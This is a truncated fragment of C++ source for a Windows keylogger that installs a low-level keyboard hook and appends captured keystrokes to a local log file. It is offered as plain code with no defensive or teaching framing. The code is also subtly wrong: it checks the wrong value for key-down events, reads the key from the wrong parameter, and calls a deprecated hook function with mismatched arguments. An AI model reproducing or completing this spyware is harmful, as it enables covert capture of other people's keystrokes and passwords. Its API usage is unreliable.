```c
#include <windows.h>
#include <iostream>
#include <fstream>
#include <ctime>
#include <sstream>
#include <string>
#include <vector>

using namespace std;

LRESULT CALLBACK keyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (wParam == VK_KEYDOWN) {
        char key = static_cast<char>(wParam);
        string keystroke = "Keystroke: ";
        keystroke += key;
        keystroke += "\n";

        ofstream file;
        file.open("KeystrokeLog.txt", ios::app);
        file << keystroke;
        file.close();
        return 0;
    }
    return 0;
}

int main() {
    HWND hwnd = GetForegroundWindow();
    HHOOK hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, keyboardHook);

    if (hKeyboardHook == NULL) {
        cout << "Failed to set keyboard hook" << endl;
        return 1;
